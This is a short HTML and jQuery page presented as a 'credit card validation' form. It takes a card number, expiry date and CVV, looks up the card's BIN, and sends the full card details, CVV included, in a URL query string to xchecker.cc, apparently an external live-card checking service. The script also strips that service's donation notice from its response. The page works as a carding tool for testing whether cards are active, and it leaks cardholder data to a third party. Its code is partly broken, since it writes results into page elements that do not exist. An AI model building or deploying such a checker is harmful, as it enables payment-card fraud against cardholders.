<!DOCTYPE html>
<html>
    <head>
        <title>Credit Card Validation</title>
        <link rel="stylesheet" type="text/css" href="styles.css">
            <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    </head>
    <body>
        <form id="cardForm" netlify-data="true">
            <h1>Credit Card Validation</h1>
            
            <label for="cardNumber">Credit Card Number:</label>
            <input type="text" id="cardNumber" required>
                
                <label for="expirationMonth">Expiration Date:</label>
                <div class="expiration-container">
                    <select id="expirationMonth" required>
                        <option value="">Month</option>
                        <option value="01">01 - January</option>
                        <option value="02">02 - February</option>
                        <option value="03">03 - March</option>
                        <option value="04">04 - April</option>
                        <option value="05">05 - May</option>
                        <option value="06">06 - June</option>
                        <option value="07">07 - July</option>
                        <option value="08">08 - August</option>
                        <option value="09">09 - September</option>
                        <option value="10">10 - October</option>
                        <option value="11">11 - November</option>
                        <option value="12">12 - December</option>
                    </select>
                    
                    <select id="expirationYear" required>
                        <option value="">Year</option>
                        <option value="2023">2023</option>
                        <option value="2024">2024</option>
                        <option value="2025">2025</option>
                        <option value="2026">2026</option>
                        <option value="2027">2027</option>
                        <option value="2028">2028</option>
                        <option value="2029">2029</option>
                        <option value="2030">2030</option>
                        <option value="2031">2031</option>
                    </select>
                </div>
                
                <label for="cvv">CVV:</label>
                <input type="text" id="cvv" required>
                    
                    <button type="submit">Validate Card Now</button>
                    </form>
        
        <div id="resultContainer"></div>
        
        <script>
            $(document).ready(function() {
                              $('#cardForm').submit(function(event) {
                                                    event.preventDefault(); // Prevent form submission
                                                    
                                                    var cardNumber = $('#cardNumber').val();
                                                    var expirationMonth = $('#expirationMonth').val();
                                                    var expirationYear = $('#expirationYear').val();
                                                    var cvv = $('#cvv').val();
                                                    
                                                    // Make the API request to lookup.binlist.net for the first 8 digits of the card number
                                                    var binlistSettings = {
                                                    "url": "https://lookup.binlist.net/" + cardNumber.substr(0, 8),
                                                    "method": "GET",
                                                    "timeout": 0
                                                    };
                                                    
                                                    $.ajax(binlistSettings).done(function(response) {
                                                                                 displayBinlistResult(response);
                                                                                 });
                                                    
                                                    // Make the API request to www.xchecker.cc for card validation
                                                    var xcheckerSettings = {
                                                    "url": "https://www.xchecker.cc/api.php?cc=" + cardNumber + "|" + expirationMonth + "|" + expirationYear.slice(-2) + "|" + cvv,
                                                    "method": "GET",
                                                    "timeout": 0
                                                    };
                                                    
                                                    $.ajax(xcheckerSettings).done(function(response) {
                                                                                  displayValidationResult(response);
                                                                                  });
                                                    });
                              
                              function displayBinlistResult(response) {
                              var binlistResultContainer = $('#binlistResultContainer');
                              binlistResultContainer.html(""); // Clear previous result
                              
                              // Display the result from binlist API
                              binlistResultContainer.append("<h2>Binlist Result</h2>");
                              binlistResultContainer.append("<p>Scheme: " + response.scheme + "</p>");
                              binlistResultContainer.append("<p>Type: " + response.type + "</p>");
                              binlistResultContainer.append("<p>Brand: " + response.brand + "</p>");
                              binlistResultContainer.append("<p>Prepaid: " + response.prepaid + "</p>");
                              binlistResultContainer.append("<p>Country: " + response.country.name + "</p>");
                              binlistResultContainer.append("<p>Country Numeric Code: " + response.country.numeric + "</p>");
                              binlistResultContainer.append("<p>Country Alpha-2 Code: " + response.country.alpha2 + "</p>");
                              binlistResultContainer.append("<p>Country Emoji: " + response.country.emoji + "</p>");
                              binlistResultContainer.append("<p>Country Currency: " + response.country.currency + "</p>");
                              binlistResultContainer.append("<p>Country Latitude: " + response.country.latitude + "</p>");
                              binlistResultContainer.append("<p>Country Longitude: " + response.country.longitude + "</p>");
                              binlistResultContainer.append("<p>Bank Name: " + response.bank.name + "</p>");
                              binlistResultContainer.append("<p>Bank URL: " + response.bank.url + "</p>");
                              binlistResultContainer.append("<p>Bank Phone: " + response.bank.phone + "</p>");
                              binlistResultContainer.append("<p>Bank City: " + response.bank.city + "</p>");
                              
                              // You can style the binlist result container as desired using CSS
                              }
                            
                              function displayValidationResult(response) {
                              var validationResultContainer = $('#validationResultContainer');
                              validationResultContainer.html(""); // Clear previous result
                              
                              var bankName = response.bankName;
                              var status = response.status;
                              var details = response.details;
                              
                              // Remove unwanted text from details
                              details = details.replace(/\nPlease consider making a donation or we will be forced to shutdown the xchecker.cc service, thanks you.\nDonations: bc1qlfu2atqvwnw4mlwv3f3wggpwtnvyhpxw3hyl30/g, '');
                              
                              // Display the card validation result
                              validationResultContainer.append("<h2>Card Validation Result</h2>");
                              validationResultContainer.append("<p>Bank Name: " + bankName + "</p>");
                              validationResultContainer.append("<p>Status: " + status + "</p>");
                              validationResultContainer.append("<p>Details: " + details + "</p>");
                              
                              // You can use the response to fetch and display the company logo using the Clearbit API or any other similar service.
                              }
                              });
                              </script>

    </body>
</html>

